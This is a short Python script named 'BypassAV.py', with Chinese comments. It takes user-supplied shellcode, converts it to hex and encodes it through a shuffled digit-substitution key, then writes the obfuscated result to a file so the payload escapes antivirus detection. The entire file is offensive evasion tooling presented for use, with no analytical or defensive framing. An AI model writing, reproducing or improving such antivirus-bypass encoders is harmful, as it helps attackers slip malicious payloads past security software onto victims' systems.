import os,codecs
from random import shuffle

#转纯数字存储
def encrypt2(srcStr,password):
    arr = srcStr.split(',0x')
    for i in range(1,len(arr)):
        arr[i]=int(arr[i],16)
        tempStr = ""
        for index in range(len(str(arr[i]))):
            tempStr=tempStr+password[int(str(arr[i])[index])]
        arr[i]=str(len(tempStr))+tempStr
    #print(arr)
    return ''.join(arr)

#随机排列字符串
def shuffle_str(s):
    str_list = list(s)
    shuffle(str_list)
    return ''.join(str_list)

#shellcode格式转换
def str_to_hex(shellcode):
    raw = ""
    for i in range(0, len(shellcode)):
        s = hex(ord(shellcode[i])).replace("0x",',0x')
        raw = raw + s
    return raw
    
if __name__ == '__main__':
    print("""
     ____                                __      __
    |  _ \                              /\ \    / /
    | |_) |_   _ _ __   __ _ ___ ___   /  \ \  / / 
    |  _ <| | | | '_ \ / _` / __/ __| / /\ \ \/ /  
    | |_) | |_| | |_) | (_| \__ \__ \/ ____ \  /   
    |____/ \__, | .__/ \__,_|___/___/_/    \_\/    V1.0
            __/ | |                                
           |___/|_|    
    """)
    print("exp: python BypassAV.py\r\n")
    shellcode=input("输入shellcode：")
    shellcode=codecs.unicode_escape_decode(shellcode)[0]
    jm=str_to_hex(shellcode)
    #转纯数字存储
    passwd=shuffle_str('7032614895')
    jm =passwd+encrypt2(jm, passwd)
    print("\r\nshellcode加密完成\r\n")
    with open('shellcode.txt','w') as f:
        f.write(jm)
        f.close()
